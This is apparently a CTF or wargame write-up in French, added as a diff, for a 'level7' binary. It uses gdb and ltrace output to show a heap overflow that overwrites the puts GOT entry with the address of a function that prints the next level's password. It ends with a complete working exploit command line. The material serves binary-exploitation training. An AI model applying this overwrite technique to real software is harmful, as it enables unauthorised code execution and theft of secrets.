@@ -1,0 +1,45 @@
+On commence par analyser le binaire avec objdump -D. On voit qu'il y a 2 fonctions : m et main.
+Quand on disass le programme sous gdb, on voit que la fonction main effectue deux call a malloc (1). Il va ensuite stocker l'adresse de retour de nouveaux malloc (2) dans ceux effectué avant.
+Il copie ensuite les deux premiers arguments de main aux adresses de malloc (2), ouvre le fichier .pass du level8 et le stock dans une variable global (c). Il effectue ensuite un puts de "~~".
+La fonction m effectue un time et un printf de c.
+
+Nous allons donc chercher a appeler la fonction m apres le fgets. Pour ce faire, nous allons override l'adresse de puts par celle de m.
+
+(gdb) x m 
+0x80484f4 <m>:	 "U\211\345\203\354\030\307\004$"
+
+(gdb) disass 0x8048400
+Dump of assembler code for function puts@plt:
+   0x08048400 <+0>:	jmp    DWORD PTR ds:0x8049928
+   0x08048406 <+6>:	push   0x28
+   0x0804840b <+11>:	jmp    0x80483a0
+End of assembler dump.
+
+Nous avons donc l'adresse de m : 0x80484f4 et celle de puts : 0x8049928.
+Nous allons chercher a faire overflow les mallocs avant de cpy l'adresse de m a la place de celle puts.
+
+Avec ltrace, on peut voir les adresses de retour de malloc.
+malloc(8)                                                         = 0x0804a008
+malloc(8)                                                         = 0x0804a018
+malloc(8)                                                         = 0x0804a028
+malloc(8)                                                         = 0x0804a038
+
+Jettons un oeil a l'etat de la memoire avec AAA BBB.
+(gdb) x/16x 0x0804a008
+0x804a008:	0x00000001	0x0804a018	0x00000000	0x00000011
+0x804a018:	0x00414141	0x00000000	0x00000000	0x00000011
+0x804a028:	0x00000002	0x0804a038	0x00000000	0x00000011
+0x804a038:	0x00424242	0x00000000	0x00000000	0x00020fc1
+
+En changeant l'adresse 0x0804a038 par celle de puts, on pourra y ecrire de le contenue de argv[2].
+On voit que l'adresse qu'on veut override est a 20 octets de l'adresse de depart de notre buffer.
+(gdb) r $(python -c "print 'A' * 20") BBB
+(gdb) x/16x 0x0804a008
+0x804a008:	0x00000001	0x0804a018	0x00000000	0x00000011
+0x804a018:	0x41414141	0x41414141	0x41414141	0x41414141
+0x804a028:	0x41414141	0x0804a000	0x00000000	0x00000011
+0x804a038:	0x00000000	0x00000000	0x00000000	0x00020fc1
+
+En rajoutant d'adresse de puts a la fin de l'argv[1] et en mettant celle de m dans l'argv[2], on devrait pouvoir forcer le strcpy a copier l'adresse de m a celle de puts.
+
+./level7 $(python -c 'print "A" * 20 + "\x08\x04\x99\x28"[::-1]') $(python -c 'print "\x08\x04\x84\xf4"[::-1]')
